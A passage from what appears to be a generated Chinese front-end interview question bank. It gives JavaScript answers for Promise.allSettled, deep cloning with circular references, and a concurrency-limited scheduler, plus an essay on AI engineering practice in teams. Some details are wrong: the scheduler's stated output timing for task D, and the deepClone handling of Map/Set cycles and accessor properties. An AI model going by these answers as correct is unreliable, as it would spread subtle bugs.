const p2 = new Promise(resolve => setTimeout(() => resolve('p2'), 100));

promiseRace([p1, p2]).then(console.log);  // 'p2'（先完成的）
```

**Promise.allSettled**（扩展）：

```javascript
function promiseAllSettled(promises) {
  return new Promise(resolve => {
    if (promises.length === 0) {
      resolve([]);
      return;
    }
    
    const results = new Array(promises.length);
    let completedCount = 0;
    
    promises.forEach((promise, index) => {
      Promise.resolve(promise)
        .then(value => {
          results[index] = { status: 'fulfilled', value };
        })
        .catch(reason => {
          results[index] = { status: 'rejected', reason };
        })
        .finally(() => {
          completedCount++;
          if (completedCount === promises.length) {
            resolve(results);
          }
        });
    });
  });
}
```

---

## 18. 编程题：实现一个深拷贝函数 deepClone，要求处理循环引用、Date、RegExp 等特殊类型

## 答案

```javascript
function deepClone(obj, hash = new WeakMap()) {
  // 处理 null 或基本类型
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }
  
  // 处理 Date
  if (obj instanceof Date) {
    return new Date(obj.getTime());
  }
  
  // 处理 RegExp
  if (obj instanceof RegExp) {
    return new RegExp(obj);
  }
  
  // 处理 Map
  if (obj instanceof Map) {
    const clonedMap = new Map();
    obj.forEach((value, key) => {
      clonedMap.set(deepClone(key, hash), deepClone(value, hash));
    });
    return clonedMap;
  }
  
  // 处理 Set
  if (obj instanceof Set) {
    const clonedSet = new Set();
    obj.forEach(value => {
      clonedSet.add(deepClone(value, hash));
    });
    return clonedSet;
  }
  
  // 处理循环引用
  if (hash.has(obj)) {
    return hash.get(obj);
  }
  
  // 处理数组
  if (Array.isArray(obj)) {
    const clonedArr = [];
    hash.set(obj, clonedArr);
    
    for (let i = 0; i < obj.length; i++) {
      clonedArr[i] = deepClone(obj[i], hash);
    }
    return clonedArr;
  }
  
  // 处理普通对象
  const clonedObj = Object.create(Object.getPrototypeOf(obj));
  hash.set(obj, clonedObj);
  
  // 复制 Symbol 类型的 key
  const keys = [
    ...Object.keys(obj),
    ...Object.getOwnPropertySymbols(obj)
  ];
  
  for (const key of keys) {
    const descriptor = Object.getOwnPropertyDescriptor(obj, key);
    if (descriptor) {
      Object.defineProperty(clonedObj, key, {
        ...descriptor,
        value: deepClone(descriptor.value, hash)
      });
    }
  }
  
  return clonedObj;
}

// 测试用例
const obj = {
  name: 'test',
  date: new Date(),
  regex: /abc/gi,
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3]),
  arr: [1, 2, { nested: true }],
  sym: Symbol('test'),
  fn: function() { return this.name; }
};

// 循环引用
obj.self = obj;

const cloned = deepClone(obj);

// 验证
console.log(cloned !== obj);  // true
console.log(cloned.date !== obj.date);  // true
console.log(cloned.date.getTime() === obj.date.getTime());  // true
console.log(cloned.self === cloned);  // true（循环引用正确）
console.log(cloned.arr[2] !== obj.arr[2]);  // true（嵌套对象也深拷贝）
```

---

## 19. 编程题：实现一个带并发限制的异步任务调度器 Scheduler，支持 add 方法和并发控制

## 答案

```javascript
class Scheduler {
  constructor(concurrency) {
    this.concurrency = concurrency;  // 最大并发数
    this.running = 0;                // 当前运行任务数
    this.queue = [];                 // 等待队列
  }
  
  // 添加任务
  add(task) {
    return new Promise((resolve, reject) => {
      // 将任务包装后存入队列
      this.queue.push({
        task,
        resolve,
        reject
      });
      
      // 尝试执行
      this.run();
    });
  }
  
  // 执行队列中的任务
  run() {
    // 并发数已满或队列为空
    if (this.running >= this.concurrency || this.queue.length === 0) {
      return;
    }
    
    // 取出队列中的第一个任务
    const { task, resolve, reject } = this.queue.shift();
    this.running++;
    
    // 执行任务
    task()
      .then(resolve)
      .catch(reject)
      .finally(() => {
        this.running--;
        // 任务完成，继续执行队列中的下一个
        this.run();
      });
    
    // 如果还有并发额度，继续执行
    if (this.running < this.concurrency && this.queue.length > 0) {
      this.run();
    }
  }
}

// 测试用例
const scheduler = new Scheduler(2);  // 最多并发 2 个任务

const createTask = (name, delay) => {
  return () => new Promise(resolve => {
    console.log(`开始任务 ${name}`);
    setTimeout(() => {
      console.log(`完成任务 ${name}`);
      resolve(name);
    }, delay);
  });
};

// 添加 5 个任务，但最多同时执行 2 个
scheduler.add(createTask('A', 1000));
scheduler.add(createTask('B', 500));
scheduler.add(createTask('C', 300));
scheduler.add(createTask('D', 400));
scheduler.add(createTask('E', 200));

// 预期输出：
// 开始任务 A
// 开始任务 B
// 完成任务 B (500ms)
// 开始任务 C
// 完成任务 C (800ms)
// 开始任务 D
// 完成任务 A (1000ms)
// 开始任务 E
// 完成任务 E (1200ms)
// 完成任务 D (1400ms)
```

**带优先级的增强版**：

```javascript
class PriorityScheduler extends Scheduler {
  add(task, priority = 0) {
    return new Promise((resolve, reject) => {
      // 按优先级插入队列（优先级高的在前）
      const item = { task, resolve, reject, priority };
      const index = this.queue.findIndex(i => i.priority < priority);
      
      if (index === -1) {
        this.queue.push(item);
      } else {
        this.queue.splice(index, 0, item);
      }
      
      this.run();
    });
  }
}
```

---

## 20. 你在简历中提到"AI Native 开发思维"，请谈谈你对 AI 辅助编程未来的看法，以及如何在团队中落地 AI 工程化实践

## 答案

**AI 辅助编程的未来趋势**：

1. **从 Copilot 到 Agent**：
   - 当前：代码补全、简单生成
   - 未来：端到端任务自动化（需求 → 设计 → 代码 → 测试 → 部署）

2. **领域特定模型**：
   - 前端专用模型（理解 React/Vue 模式）
   - 代码审查模型（发现安全漏洞、性能问题）

3. **多模态编程**：
   - 设计稿直接生成代码
   - 语音/自然语言驱动开发

**团队落地实践**：

```
┌─────────────────────────────────────────────────────────────┐
│                   AI 工程化落地框架                          │
├─────────────────────────────────────────────────────────────┤
│ 1. 规范层（OpenSpec/SSD）                                    │
│    - 定义标准化的 Prompt 模板                                │
│    - 建立代码生成规范                                        │
│    - 封装领域特定的 Skills                                   │
├─────────────────────────────────────────────────────────────┤
│ 2. 工具层                                                    │
│    - IDE 插件集成（Cursor/Copilot）                          │
│    - CI/CD 集成 AI 代码审查                                  │
│    - 自动化文档生成                                          │
├─────────────────────────────────────────────────────────────┤
│ 3. 流程层                                                    │
│    - 需求分析：AI 辅助拆解任务                               │
│    - 编码阶段：AI 结伴编程                                    │
│    - 代码审查：AI 预审 + 人工终审                            │
│    - 测试阶段：AI 生成测试用例                               │
├─────────────────────────────────────────────────────────────┤
│ 4. 度量层                                                    │
│    - 代码生成采纳率                                          │
│    - 开发效率提升指标                                        │
│    - 代码质量变化趋势                                        │
└─────────────────────────────────────────────────────────────┘
```

**滴滴实践经验**：

1. **Prompt 工程标准化**：
   - 建立组件生成、重构、文档等标准 Prompt
   - 使用模板引擎动态填充上下文

2. **RAG 知识库**：
   - 向量化存储团队优秀代码
   - 生成时检索相似案例作为 Few-shot

3. **渐进式推广**：
   - 从小型需求开始试点
   - 积累成功案例，逐步扩展到核心模块
   - 建立 AI 辅助开发的最佳实践文档

4. **质量保障**：
   - AI 生成代码必须经过单元测试
   - 关键模块仍需人工 Review
   - 建立 AI 代码的追溯机制

---

*面试题生成完毕 | 版本A：简历项目深度挖掘 + 前端八股文 + 算法编程*
